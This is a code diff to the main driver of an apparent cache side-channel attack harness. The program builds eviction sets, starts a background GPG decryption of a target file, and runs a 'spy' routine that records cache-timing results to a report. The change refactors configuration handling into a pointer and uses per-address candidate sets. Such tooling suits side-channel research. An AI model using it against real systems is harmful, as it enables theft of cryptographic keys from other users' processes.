@@ -80,41 +80,42 @@ int main(int argc, char **argv) {
 #else
   char* path_to_config = "../gpg/gpg-native.probe"; 
 #endif
-  Config config;
+  Config* config = NULL;
   if (parse_config(path_to_config, &config) == -1)
     return 1;
   // create addresses
-  void *addrs[config.num_addrs];
-  memcpy(addrs, config.addrs, config.num_addrs * sizeof(unsigned long *));
-  uint32_t total_results = config.num_addrs * config.time_slots;
+  void *addrs[config->num_addrs];
+  memcpy(addrs, config->addrs, config->num_addrs * sizeof(unsigned long *));
+  uint32_t total_results = config->num_addrs * config->time_slots;
   result_type results[total_results];
   memset(results, 0x00, total_results * sizeof(result_type));
 
-  printf("num_addrs: %lu\n", config.num_addrs);
-  printf("mmap_base: %p\n", config.mmap_base);
-  printf("time_slots: %lu\n", config.time_slots);
-  printf("wait_cycles: %lu\n", config.wait_cycles);
-  printf("time slot size: %lu\n", config.time_slot_size);
-  printf("threshold: %lu\n", config.threshold);
-  for (uint32_t i = 0; i < config.num_addrs; i++) {
-    printf("\taddr[%u] = %p\n", i, config.addrs[i]);
+  printf("num_addrs: %lu\n", config->num_addrs);
+  printf("mmap_base: %p\n", config->mmap_base);
+  printf("time_slots: %lu\n", config->time_slots);
+  printf("wait_cycles: %lu\n", config->wait_cycles);
+  printf("time slot size: %lu\n", config->time_slot_size);
+  printf("threshold: %lu\n", config->threshold);
+  for (uint32_t i = 0; i < config->num_addrs; i++) {
+    printf("\taddr[%u] = %p\n", i, config->addrs[i]);
   }
 
-  void* evset_bases[config.num_addrs];
+  void* evset_bases[config->num_addrs];
 #if defined(WITH_EV) && WITH_EV
-  Arr ev_sets[config.num_addrs];
-  Arr candidates = generate_candidate_set(&config, config.addrs[0]);
-  for (unsigned int i = 0; i < config.num_addrs; i++) {
-    ev_sets[i] = generate_eviction_set(&config, config.addrs[i], candidates);
-    while(ev_sets[i].len != config.associativity) {
+  Arr ev_sets[config->num_addrs];
+  Arr candidate_sets[config->num_addrs];
+  for (unsigned int i = 0; i < config->num_addrs; i++) {
+    candidate_sets[i] = generate_candidate_set(config, i);
+    ev_sets[i] = generate_eviction_set(config, config->addrs[i], candidate_sets[i]);
+    while(ev_sets[i].len != config->associativity) {
       arr_free(&ev_sets[i]);
-      ev_sets[i] = generate_eviction_set(&config, config.mmap_base, candidates);
+      ev_sets[i] = generate_eviction_set(config, config->mmap_base, candidate_sets[i]);
     }
     evset_bases[i] = ev_sets[i].arr[0];
     printf("ev.len[%d]: %u\n", i, ev_sets[i].len);
   }
-  for(unsigned int i = 0; i < config.num_addrs; i++) {
-    arr_free(&candidates);
+  for(unsigned int i = 0; i < config->num_addrs; i++) {
+    arr_free(&candidate_sets[i]);
   }
   // Arr conflict_set = generate_conflict_set(ev_sets, config.num_addrs);
   // printf("conflict set len: %u\n", conflict_set.len);
@@ -136,11 +137,11 @@ int main(int argc, char **argv) {
 #endif
 
   char system_gpg_call[1000];
-  sprintf(system_gpg_call, "(sleep %f; echo 'GPG start'; ${GPG}  --quiet -d ${TARGET_FILE} > /dev/null; echo 'GPG end') &", config.gpg_delay_secs);
+  sprintf(system_gpg_call, "(sleep %f; echo 'GPG start'; ${GPG}  --quiet -d ${TARGET_FILE} > /dev/null; echo 'GPG end') &", config->gpg_delay_secs);
   system(system_gpg_call);
   fprintf(stderr, "\t|||  ...starting spy...  |||\n");
-  spy(addrs, config.num_addrs, results, config.time_slots, config.wait_cycles,
-      config.time_slot_size, config.threshold, evset_bases);
+  spy(addrs, config->num_addrs, results, config->time_slots, config->wait_cycles,
+      config->time_slot_size, config->threshold, evset_bases);
   fprintf(stderr, "\t|||   ...closed spy...   |||\n");
 
   FILE *report = NULL;
@@ -148,14 +149,14 @@ int main(int argc, char **argv) {
     printf("ERROR: couldn't create report file\n");
     goto report_error;
   }
-  for (uint32_t i = 0; i < total_results; i += config.num_addrs) {
-    for (size_t j = 0; j < config.num_addrs; j++) {
+  for (uint32_t i = 0; i < total_results; i += config->num_addrs) {
+    for (size_t j = 0; j < config->num_addrs; j++) {
       fprintf(report, " " SCANF_RESULT_STR, results[i + j]);
     }
     fprintf(report, "\n");
   }
   fclose(report);
-  free_config(&config);
+  free_config(config);
   #if defined(WITH_EV) && WITH_EV
   // arr_free(&conflict_set);
   #endif
